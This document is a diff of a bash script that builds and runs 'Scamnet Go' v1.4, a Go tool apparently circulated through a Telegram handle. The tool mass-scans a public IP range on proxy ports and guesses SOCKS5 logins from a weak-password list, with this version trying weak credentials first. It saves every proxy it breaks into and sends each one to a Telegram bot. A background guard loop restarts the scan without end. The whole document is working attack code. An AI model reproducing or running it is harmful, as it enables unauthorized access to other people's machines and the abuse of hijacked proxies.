@@ -1,5 +1,5 @@
 #!/bin/bash
-# main.sh - Scamnet Go v1.3 OTC TG:soqunla （终极版：变量展开 + 时间正确 + 日志永不爆）
+# main.sh - Scamnet Go v1.4 OTC TG:soqunla （终极防漏扫版）
 set -euo pipefail
 IFS=$'\n\t'
 RED='\033[31m'; GREEN='\033[32m'; YELLOW='\033[33m'; BLUE='\033[34m'; NC='\033[0m'
@@ -16,8 +16,8 @@ if ! command -v go >/dev/null 2>&1; then
     exit 1
 fi
 
-DEFAULT_START="157.254.32.0"
-DEFAULT_END="157.254.52.255"
+DEFAULT_START="47.80.0.0"
+DEFAULT_END="47.86.255.255"
 read_ip() { echo -e "${YELLOW}$1（默认: $2）:${NC}"; read -r input; eval "$3=\"\${input:-$2}\""; }
 read_ip "起始 IP" "$DEFAULT_START" START_IP
 read_ip "结束 IP" "$DEFAULT_END" END_IP
@@ -30,8 +30,8 @@ if [ "$(printf '%s\n' "$START_IP" "$END_IP" | sort -V | head -n1)" != "$START_IP
 fi
 succ "范围: $START_IP - $END_IP"
 
-echo -e "${YELLOW}端口（默认: 1080，支持 1080,8080 或 1000-2000）:${NC}"
-read -r PORT_INPUT; PORT_INPUT=${PORT_INPUT:-1080}
+echo -e "${YELLOW}端口（默认: 1080,8080,8888,3128）:${NC}"
+read -r PORT_INPUT; PORT_INPUT=${PORT_INPUT:-1080,8080,8888,3128}
 PORTS=$(echo "$PORT_INPUT" | tr ',' ' ')
 succ "端口: $PORT_INPUT"
 
@@ -39,9 +39,9 @@ echo -e "${YELLOW}Telegram Bot Token（可选）:${NC}"; read -r TELEGRAM_TOKEN
 echo -e "${YELLOW}Telegram Chat ID（可选）:${NC}"; read -r TELEGRAM_CHATID
 [[ -n $TELEGRAM_TOKEN && -n $TELEGRAM_CHATID ]] && succ "Telegram 启用" || { TELEGRAM_TOKEN=""; TELEGRAM_CHATID=""; log "Telegram 禁用"; }
 
-log "正在编译 Go 扫描器（OTC 终极版 TG:soqunla）..."
+log "正在编译 Go 扫描器（v1.4 防漏扫版 TG:soqunla）..."
 
-# ============ 完全修复的 Go 源码 ============
+# ============ 终极修复 Go 源码 ============
 cat > scamnet.go << 'EOF'
 package main
 
@@ -158,6 +158,11 @@ func main() {
 	flag.IntVar(&cfg.Timeout, "timeout", 6, "Timeout seconds")
 	flag.Parse()
 
+	// 强制参数
+	if cfg.MaxConcurrent == 0 { cfg.MaxConcurrent = 150 }
+	if cfg.BatchSize == 0 { cfg.BatchSize = 250 }
+	if cfg.Timeout == 0 { cfg.Timeout = 6 }
+
 	if cfg.StartIP == "" || cfg.EndIP == "" {
 		fmt.Println("Usage: scamnet_go -start 1.1.1.1 -end 1.1.1.255 -ports 1080")
 		os.Exit(1)
@@ -172,14 +177,12 @@ func main() {
 	fmt.Printf("[*] 总任务: %d | 每批: %d | 批次: %d\n", total, cfg.BatchSize, batchCount)
 
 	f, _ := os.OpenFile(validFile, os.O_CREATE|os.O_WRONLY|os.O_TRUNC, 0644)
-	f.WriteString("# Scamnet Go v1.3 OTC TG:soqunla - " + time.Now().Format("2006-01-02 15:04:05") + "\n")
+	f.WriteString("# Scamnet Go v1.4 OTC TG:soqunla - " + time.Now().Format("2006-01-02 15:04:05") + "\n")
 	f.Close()
 
 	for batchStart := uint64(0); batchStart < total; batchStart += uint64(cfg.BatchSize) {
 		batchEnd := batchStart + uint64(cfg.BatchSize)
-		if batchEnd > total {
-			batchEnd = total
-		}
+		if batchEnd > total { batchEnd = total }
 		fmt.Printf("[*] 批次 %d/%d → %d tasks\n", batchStart/uint64(cfg.BatchSize)+1, batchCount, batchEnd-batchStart)
 		scanBatchByIndex(start, end, ports, batchStart, batchEnd)
 	}
@@ -189,25 +192,27 @@ func main() {
 
 func scanBatchByIndex(startIP, endIP uint32, ports []int, batchStart, batchEnd uint64) {
 	sem := semaphore.NewWeighted(int64(cfg.MaxConcurrent))
-	ctx := context.Background()
+	ctx, cancel := context.WithCancel(context.Background())
+	defer cancel()
 	var wg sync.WaitGroup
 	taskIdx := batchStart
 
 	for ip := startIP; ip <= endIP && taskIdx < batchEnd; ip++ {
 		s := intToIP(ip)
 		for _, p := range ports {
-			if taskIdx >= batchEnd {
-				goto done
-			}
+			if taskIdx >= batchEnd { goto done }
 			target := fmt.Sprintf("%s:%d", s, p)
 			wg.Add(1)
 			go func(t string) {
 				defer wg.Done()
-				if err := sem.Acquire(ctx, 1); err != nil {
-					return
+				select {
+				case <-ctx.Done(): return
+				case <-time.After(8 * time.Second): return
+				default:
+					if err := sem.Acquire(ctx, 1); err != nil { return }
+					defer sem.Release(1)
+					scanTarget(t)
 				}
-				defer sem.Release(1)
-				scanTarget(t)
 			}(target)
 			taskIdx++
 		}
@@ -217,23 +222,23 @@ done:
 }
 
 func scanTarget(target string) {
-	if _, ok := seen.Load(target); ok {
-		return
-	}
+	if _, ok := seen.Load(target); ok { return }
 	seen.Store(target, true)
 	parts := strings.SplitN(target, ":", 2)
 	ip := parts[0]
 	port, _ := strconv.Atoi(parts[1])
 
-	if ok, lat, origin := testSocks5(ip, port, "", ""); ok && lat < 500 {
-		saveAndNotify(ip, port, "", "", origin, lat)
-		return
-	}
+	// 弱口令优先
 	for _, p := range weakPairs {
 		if ok, lat, origin := testSocks5(ip, port, p[0], p[1]); ok && lat < 500 {
 			saveAndNotify(ip, port, p[0], p[1], origin, lat)
 			return
 		}
+	}
+
+	// 最后扫无密码
+	if ok, lat, origin := testSocks5(ip, port, "", ""); ok && lat < 500 {
+		saveAndNotify(ip, port, "", "", origin, lat)
 	}
 }
 
@@ -243,9 +248,8 @@ func testSocks5(ip string, port int, user, pass string) (bool, int, string) {
 		proxyURL = fmt.Sprintf("socks5://%s:%d", ip, port)
 	}
 	u, err := url.Parse(proxyURL)
-	if err != nil {
-		return false, 0, ""
-	}
+	if err != nil { return false, 0, "" }
+
 	client := &http.Client{
 		Transport: &http.Transport{
 			Proxy:               http.ProxyURL(u),
@@ -254,51 +258,49 @@ func testSocks5(ip string, port int, user, pass string) (bool, int, string) {
 			ResponseHeaderTimeout: time.Duration(cfg.Timeout) * time.Second,
 		},
 		Timeout: time.Duration(cfg.Timeout) * time.Second,
+		CheckRedirect: func(req *http.Request, via []*http.Request) error {
+			return http.ErrUseLastResponse
+		},
 	}
+
 	start := time.Now()
 	resp, err := client.Get("https://httpbin.org/ip")
 	lat := int(time.Since(start).Milliseconds())
-	if err != nil || resp.StatusCode != 200 {
-		return false, 0, ""
-	}
+
+	if err != nil { return false, lat, "" }
 	defer resp.Body.Close()
-	body, _ := ioutil.ReadAll(resp.Body)
+
+	body, err := ioutil.ReadAll(resp.Body)
+	if err != nil { return false, lat, "" }
+
+	// 调试日志
+	fmt.Fprintf(os.Stderr, "[DEBUG] %s:%d | Status: %d | Body: %s\n", ip, port, resp.StatusCode, string(body))
+
 	var info IPInfo
-	if err := json.Unmarshal(body, &info); err != nil {
-		return false, 0, ""
-	}
-	if info.Origin == "" {
-		return false, 0, ""
-	}
+	if err := json.Unmarshal(body, &info); err != nil { return false, lat, "" }
+	if info.Origin == "" { return false, lat, "" }
 	return true, lat, info.Origin
 }
 
 func saveAndNotify(ip string, port int, user, pass, origin string, lat int) {
 	country := getCountry(origin)
 	auth := ""
-	if user != "" || pass != "" {
-		auth = user + ":" + pass + "@"
-	}
+	if user != "" || pass != "" { auth = user + ":" + pass + "@" }
 	result := fmt.Sprintf("socks5://%s%s:%d#%s", auth, ip, port, country)
 	f, _ := os.OpenFile(validFile, os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0644)
 	fmt.Fprintln(f, result)
 	f.Close()
-
 	statsMu.Lock()
 	stats[country]++
 	statsMu.Unlock()
-
 	fmt.Printf("[+] %s (%dms)\n", result, lat)
-
 	if cfg.TelegramToken != "" {
 		sendTelegram(fmt.Sprintf("New: <code>%s</code>\nDelay: %dms | %s", result, lat, country))
 	}
 }
 
 func getCountry(ip string) string {
-	if c, ok := countryCache.Load(ip); ok {
-		return c.(string)
-	}
+	if c, ok := countryCache.Load(ip); ok { return c.(string) }
 	for _, u := range []string{
 		"http://ip-api.com/json/" + ip + "?fields=countryCode",
 		"https://ipinfo.io/" + ip + "/country",
@@ -318,9 +320,7 @@ func getCountry(ip string) string {
 }
 
 func sendTelegram(msg string) {
-	if cfg.TelegramToken == "" || cfg.TelegramChat == "" {
-		return
-	}
+	if cfg.TelegramToken == "" || cfg.TelegramChat == "" { return }
 	urlStr := "https://api.telegram.org/bot" + cfg.TelegramToken + "/sendMessage"
 	data := url.Values{}
 	data.Set("chat_id", cfg.TelegramChat)
@@ -342,16 +342,12 @@ func dedupAndReport() {
 	file.Close()
 
 	sorted := make([]string, 0, len(lines))
-	for l := range lines {
-		sorted = append(sorted, l)
-	}
+	for l := range lines { sorted = append(sorted, l) }
 	sort.Strings(sorted)
 
 	out, _ := os.Create(validFile + ".tmp")
-	out.WriteString("# Scamnet Go v1.3 OTC TG:soqunla - " + time.Now().Format("2006-01-02 15:04:05") + "\n")
-	for _, l := range sorted {
-		out.WriteString(l + "\n")
-	}
+	out.WriteString("# Scamnet Go v1.4 OTC TG:soqunla - " + time.Now().Format("2006-01-02 15:04:05") + "\n")
+	for _, l := range sorted { out.WriteString(l + "\n") }
 	out.Close()
 	os.Rename(validFile+".tmp", validFile)
 
@@ -382,9 +378,7 @@ func parsePorts(s string) []int {
 			parts := strings.Split(p, "-")
 			start, _ := strconv.Atoi(parts[0])
 			end, _ := strconv.Atoi(parts[1])
-			for i := start; i <= end; i++ {
-				ports = append(ports, i)
-			}
+			for i := start; i <= end; i++ { ports = append(ports, i) }
 		} else {
 			i, _ := strconv.Atoi(p)
 			ports = append(ports, i)
@@ -398,9 +392,9 @@ EOF
 go mod init scamnet 2>/dev/null || true
 go get golang.org/x/sync/semaphore 2>/dev/null || true
 GOOS=linux GOARCH=amd64 go build -ldflags="-s -w" -o "$GO_BIN" scamnet.go
-succ "Go 扫描器编译完成 TG:soqunla → $GO_BIN"
+succ "Go 扫描器编译完成 → $GO_BIN"
 
-# ============ 最终守卫脚本：变量正确展开 + 日志轮转 ============
+# ============ 守护脚本 ============
 GUARD_SCRIPT="$LOG_DIR/scamnet_guard.sh"
 cat > "$GUARD_SCRIPT" << EOF
 #!/bin/bash
@@ -413,25 +407,16 @@ PORTS="$PORTS"
 TELEGRAM_TOKEN="$TELEGRAM_TOKEN"
 TELEGRAM_CHATID="$TELEGRAM_CHATID"
 
-# 确保日志存在
 > "\$LOG"
-echo "[GUARD] \$(date '+%Y-%m-%d %H:%M:%S') - Scamnet OTC TG:soqunla 启动" | tee -a "\$LOG"
+echo "[GUARD] \$(date '+%Y-%m-%d %H:%M:%S') - Scamnet v1.4 启动" | tee -a "\$LOG"
 echo "[GUARD] 范围: \$START_IP ~ \$END_IP | 端口: \$PORTS" | tee -a "\$LOG"
 
 while :; do
     echo "[GUARD] \$(date '+%Y-%m-%d %H:%M:%S') - 开始扫描..." | tee -a "\$LOG"
-
-    "\$GO_BIN" \\
-        -start "\$START_IP" \\
-        -end "\$END_IP" \\
-        -ports "\$PORTS" \\
-        -tg-token "\$TELEGRAM_TOKEN" \\
-        -tg-chat "\$TELEGRAM_CHATID" \\
-        -batch 250 \\
-        -conc 150 \\
-        -timeout 6 \\
-        2>&1 | grep -E '^\\\[\\+\\\]|\\\[GUARD\\\]' | tee -a "\$LOG"
-
+    "\$GO_BIN" -start "\$START_IP" -end "\$END_IP" -ports "\$PORTS" \
+        -tg-token "\$TELEGRAM_TOKEN" -tg-chat "\$TELEGRAM_CHATID" \
+        -batch 250 -conc 150 -timeout 6 \
+        2>&1 | grep -E '^\\\[\\+\\\]|\\\[GUARD\\\]|\\\[DEBUG\\\]' | tee -a "\$LOG"
     tail -n "\$MAX_LINES" "\$LOG" > "\$LOG.tmp" 2>/dev/null && mv "\$LOG.tmp" "\$LOG"
     echo "[GUARD] \$(date '+%Y-%m-%d %H:%M:%S') - 本轮结束，3秒后重启..." | tee -a "\$LOG"
     sleep 3
@@ -439,12 +424,10 @@ done
 EOF
 chmod +x "$GUARD_SCRIPT"
 
-# 停止旧进程 + 启动新版
 pkill -f "scamnet_guard.sh" 2>/dev/null || true
 sleep 1
 nohup bash "$GUARD_SCRIPT" > /dev/null 2>&1 &
-succ "守护进程已启动 TG:soqunla！PID: $!"
-log "日志: tail -f $LATEST_LOG (仅 500 行)"
-log "停止: pkill -f scamnet_guard.sh"
+succ "守护进程已启动！PID: $!"
+log "日志: tail -f $LATEST_LOG"
 log "结果: cat $VALID_FILE"
-log "空间释放: > $LATEST_LOG"
+log "停止: pkill -f scamnet_guard.sh"
